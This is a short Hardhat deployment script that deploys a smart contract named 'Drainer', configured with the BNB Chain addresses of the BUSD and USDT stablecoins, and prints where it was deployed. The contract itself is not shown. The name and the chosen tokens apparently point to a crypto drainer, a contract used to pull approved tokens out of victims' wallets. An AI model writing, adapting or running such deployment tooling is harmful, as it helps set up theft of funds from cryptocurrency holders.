const hre = require("hardhat");

async function main() {
  const tokenAddresses = [
    "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
    "0x55d398326f99059ff775485246999027b3197955", // USDT
  ];

  const Drainer = await hre.ethers.getContractFactory("Drainer");
  const drainer = await Drainer.deploy(tokenAddresses);
  await drainer.waitForDeployment();

  console.log(`Drainer deployed to: ${await drainer.getAddress()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});